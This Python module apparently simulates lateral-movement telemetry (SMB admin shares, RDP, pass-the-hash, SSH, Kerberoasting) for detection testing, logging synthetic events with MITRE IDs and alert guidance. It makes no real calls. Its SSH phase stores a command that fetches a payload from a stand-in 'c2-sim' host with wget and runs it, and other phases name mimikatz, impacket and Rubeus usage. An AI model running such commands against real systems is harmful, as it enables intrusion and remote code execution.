from core.engine.payload_registry import register_payload
#!/usr/bin/env python3
# SHENRON: SMB Lateral Crawler — lateral movement via SMB/RDP/SSH simulator
# PURPOSE: Emit defender-observable telemetry for lateral movement patterns
# PRINCIPLE: Observable adversarial behavior, not portable adversarial procedure
# MITRE: T1021 (Remote Services), T1021.001 (Remote Desktop Protocol),
#        T1021.002 (SMB/Windows Admin Shares), T1021.004 (SSH),
#        T1021.006 (Windows Remote Management),
#        T1570 (Lateral Tool Transfer), T1550.002 (Pass the Hash),
#        T1557 (Adversary-in-the-Middle), T1558 (Steal or Forge Kerberos Tickets),
#        T1558.003 (Kerberoasting)
# DETECTION NOTES:
#   - Alert on: admin share access (C$, ADMIN$, IPC$) by non-admin tools
#   - RDP from non-standard source hosts, especially workstation-to-workstation
#   - Pass-the-hash: NTLM auth with mismatched source (different from logged-in user)
#   - WinRM connections from unusual processes (not mmc.exe, not IT tools)
#   - SSH from Windows hosts to internal Linux systems
#   - Kerberoasting: high-volume Kerberos TGS requests for service accounts
#   - Lateral tool transfer: file copy to admin shares immediately before execution
# NO SUBPROCESS CALLS — all lateral movement patterns are synthetic
# NO NETWORK CALLS — all SMB/RDP patterns are synthetic

import json
import uuid
import random
from datetime import datetime, timezone
from pathlib import Path
from core.config import artifact_log_path as _artifact_log_path


def _get_artifact_log():
    p = _artifact_log_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    return p


FAKE_HOSTS = [
    "DC01-SIM", "DC02-SIM", "FILESERVER01-SIM",
    "SQLSERVER-SIM", "WORKSTATION-042-SIM", "DEVBOX-SIM"
]
FAKE_ADMIN_SHARES = ["C$", "ADMIN$", "IPC$", "D$"]
FAKE_SERVICE_ACCOUNTS = [
    "SVC_SQL_SIM", "SVC_IIS_SIM", "SVC_BACKUP_SIM",
    "SVC_SCCM_SIM", "MSSQLSVC_SIM"
]
FAKE_NTLM_HASHES = [
    "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 [SIM]",
    "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c [SIM]",
]
FAKE_KERBEROS_TICKETS = [
    "SVC_SQL_SIM/sqlserver-sim.domain.local:1433",
    "SVC_IIS_SIM/webserver-sim.domain.local:80",
]
FAKE_PROCESSES = [
    "cmd.exe", "powershell.exe", "wmic.exe",
    "net.exe", "smbclient", "psexec.exe [SIM]"
]
FAKE_LINUX_HOSTS = [
    "ubuntu-build-sim", "jenkins-sim", "gitlab-runner-sim"
]


def _log_event(event: dict):
    with open(_get_artifact_log(), "a") as f:
        f.write(json.dumps(event) + "\n")


def _base_event(session_id, mitre, behavior, opps, phase):
    return {
        "artifact_id":             str(uuid.uuid4()),
        "session_id":              session_id,
        "layer":                   "smb_lateral_crawler",
        "phase":                   phase,
        "mitre_techniques":        mitre,
        "behavior_class":          behavior,
        "detection_opportunities": opps,
        "simulation_only":         True,
        "executable":              False,
        "no_payload_present":      True,
        "network_calls_made":      False,
        "subprocess_spawned":      False,
        "timestamp":               datetime.now(timezone.utc).isoformat(),
    }


def _phase_smb_admin_share(session_id):
    source = random.choice(FAKE_HOSTS)
    target = random.choice([h for h in FAKE_HOSTS if h != source])
    share  = random.choice(FAKE_ADMIN_SHARES)
    proc   = random.choice(FAKE_PROCESSES)
    payload = f"payload_sim_{uuid.uuid4().hex[:8]}.exe"

    event = _base_event(session_id,
        mitre=["T1021.002", "T1570"],
        behavior="smb_admin_share_lateral_sim",
        opps=[
            "admin_share_access_non_admin_tool_sim",
            "file_copy_to_admin_share_before_execution_sim",
            "net_use_admin_share_commandline_sim",
            "psexec_pattern_smb_pipe_create_sim",
        ],
        phase="smb_admin_share")
    event.update({
        "source_host_sim":     source,
        "target_host_sim":     target,
        "share_sim":           f"\\\\{target}\\{share}",
        "source_process_sim":  proc,
        "file_copied_sim":     payload,
        "unc_path_sim":        f"\\\\{target}\\{share}\\{payload}",
        "exec_method_sim":     "Service creation via SMB named pipe SVCCTL",
        "detection_note": (
            f"SMB admin share access from '{source}' to '\\\\{target}\\{share}' "
            f"via '{proc}'. File '{payload}' copied then executed via service creation. "
            f"Alert: C$/ADMIN$ access from workstations, service create via SVCCTL pipe."
        ),
    })
    _log_event(event)
    return event


def _phase_rdp_lateral(session_id):
    source = random.choice(FAKE_HOSTS)
    target = random.choice([h for h in FAKE_HOSTS if h != source])
    cred_type = random.choice(["stolen NTLM hash", "plaintext credential", "Kerberos ticket"])

    event = _base_event(session_id,
        mitre=["T1021.001", "T1550.002"],
        behavior="rdp_lateral_movement_sim",
        opps=[
            "rdp_workstation_to_workstation_connection_sim",
            "rdp_login_outside_business_hours_sim",
            "unusual_rdp_source_process_mstsc_from_script_sim",
            "new_rdp_session_no_prior_interactive_logon_sim",
        ],
        phase="rdp_lateral")
    event.update({
        "source_host_sim":   source,
        "target_host_sim":   target,
        "port_sim":          3389,
        "credential_sim":    cred_type,
        "session_type_sim":  "RDP (Type 10 logon)",
        "logon_event_sim":   "Event ID 4624 (Logon Type 10) on target",
        "source_event_sim":  "Event ID 4648 (Explicit credentials used) on source",
        "detection_note": (
            f"RDP lateral movement '{source}' → '{target}' using {cred_type}. "
            f"Workstation-to-workstation RDP is rare legitimate use. "
            f"Alert: Type 10 logon on non-jump-server hosts, "
            f"Event ID 4648 with RDP session initiation."
        ),
    })
    _log_event(event)
    return event


def _phase_pass_the_hash(session_id):
    source = random.choice(FAKE_HOSTS)
    target = random.choice([h for h in FAKE_HOSTS if h != source])
    ntlm_hash = random.choice(FAKE_NTLM_HASHES)
    tool = random.choice(["impacket wmiexec", "mimikatz sekurlsa::pth", "CrackMapExec", "psexec.py [SIM]"])

    event = _base_event(session_id,
        mitre=["T1550.002", "T1021.002"],
        behavior="pass_the_hash_lateral_sim",
        opps=[
            "ntlm_auth_without_matching_interactive_logon_sim",
            "type3_logon_no_prior_type2_from_same_source_sim",
            "pth_tool_commandline_pattern_sim",
            "new_process_token_ntlm_hash_injection_sim",
        ],
        phase="pass_the_hash")
    event.update({
        "source_host_sim":   source,
        "target_host_sim":   target,
        "tool_sim":          tool,
        "ntlm_hash_sim":     ntlm_hash,
        "auth_type_sim":     "NTLM (no plaintext password)",
        "logon_type_sim":    "Type 3 (Network) with no prior Type 2 (Interactive)",
        "detection_note": (
            f"Pass-the-hash from '{source}' to '{target}' via '{tool}'. "
            f"NTLM Type 3 logon with no prior interactive session — "
            f"source host has never logged into target interactively. "
            f"Alert: Event ID 4624 Type 3 + NTLM from workstation to server."
        ),
    })
    _log_event(event)
    return event


def _phase_ssh_lateral(session_id):
    source = random.choice(FAKE_HOSTS)
    target = random.choice(FAKE_LINUX_HOSTS)
    key_path = random.choice([
        r"C:\Users\sim_user\.ssh\id_rsa",
        r"C:\ProgramData\.ssh\id_rsa",
        "/root/.ssh/id_rsa",
    ])

    event = _base_event(session_id,
        mitre=["T1021.004"],
        behavior="ssh_lateral_movement_sim",
        opps=[
            "ssh_from_windows_host_to_internal_linux_sim",
            "ssh_key_use_without_prior_keygen_sim",
            "unusual_ssh_source_process_not_terminal_sim",
            "ssh_agent_forwarding_abuse_sim",
        ],
        phase="ssh_lateral")
    event.update({
        "source_host_sim":    source,
        "target_host_sim":    target,
        "ssh_key_sim":        key_path,
        "auth_method_sim":    "publickey (stolen private key)",
        "port_sim":           22,
        "commandline_sim":    f"ssh -i {key_path} root@{target} 'wget -O /tmp/.sim http://c2-sim/s && chmod +x /tmp/.sim && /tmp/.sim'",
        "detection_note": (
            f"SSH lateral movement from Windows host '{source}' to Linux '{target}' "
            f"using key at '{key_path}'. "
            f"Alert: SSH from Windows hosts not designated as jump servers, "
            f"SSH key use from paths outside user profile, post-auth command execution."
        ),
    })
    _log_event(event)
    return event


def _phase_kerberoasting(session_id):
    svc_accounts = random.sample(FAKE_SERVICE_ACCOUNTS, 3)
    tickets = random.sample(FAKE_KERBEROS_TICKETS, 2)
    proc = random.choice(["powershell.exe", "Rubeus.exe [SIM]", "GetUserSPNs.py [SIM]"])

    event = _base_event(session_id,
        mitre=["T1558", "T1558.003"],
        behavior="kerberoasting_tgs_harvest_sim",
        opps=[
            "high_volume_tgs_requests_single_source_sim",
            "tgs_request_for_service_accounts_without_login_sim",
            "rc4_encryption_downgrade_tgs_request_sim",
            "kerberoast_tool_spn_enumeration_pattern_sim",
        ],
        phase="kerberoasting")
    event.update({
        "source_process_sim":      proc,
        "target_accounts_sim":     svc_accounts,
        "tickets_requested_sim":   tickets,
        "encryption_type_sim":     "RC4-HMAC (0x17) — downgraded for offline cracking",
        "tgs_request_count_sim":   len(svc_accounts),
        "time_window_sim":         f"{random.randint(2,15)} seconds [SIM]",
        "crack_target_sim":        "Hashcat mode 13100 — offline Kerberos TGS crack",
        "detection_note": (
            f"Kerberoasting via '{proc}' — {len(svc_accounts)} TGS requests in "
            f"rapid succession with RC4 downgrade. "
            f"Alert: multiple TGS-REQ for service accounts from single source, "
            f"especially with RC4 when AES is available (Event ID 4769)."
        ),
    })
    _log_event(event)
    return event


@register_payload("smb_lateral_crawler")
def main():
    session_id = str(uuid.uuid4())
    phases = [
        ("smb_admin_share", _phase_smb_admin_share),
        ("rdp_lateral",     _phase_rdp_lateral),
        ("pass_the_hash",   _phase_pass_the_hash),
        ("ssh_lateral",     _phase_ssh_lateral),
        ("kerberoasting",   _phase_kerberoasting),
    ]

    print(f"\n  [SIMULATION]  smb_lateral_crawler")
    print(f"  [SESSION]     {session_id}")
    print(f"  [EVENTS]      {len(phases)}")
    print(f"  [MITRE]       T1021.001, T1021.002, T1021.004, T1550.002, T1557, T1558.003, T1570")
    print(f"  [SUBPROCESS]  NOT CALLED — synthetic only")
    print(f"  [NETWORK]     NO CALLS MADE — synthetic only")
    print()

    events = []
    for phase_name, phase_fn in phases:
        event = phase_fn(session_id)
        events.append(event)
        print(f"  [PHASE: {phase_name}]")
        print(f"    behavior      : {event['behavior_class']}")
        print(f"    mitre         : {', '.join(event['mitre_techniques'])}")
        print(f"    detection     : {event['detection_opportunities'][0]}")
        print(f"    note          : {event.get('detection_note','')[:80]}")
        print()

    print(f"  [LOGGED]      {_get_artifact_log()}")
    print(f"  [SAFE]        no subprocess calls, no network — simulation only")
    return events
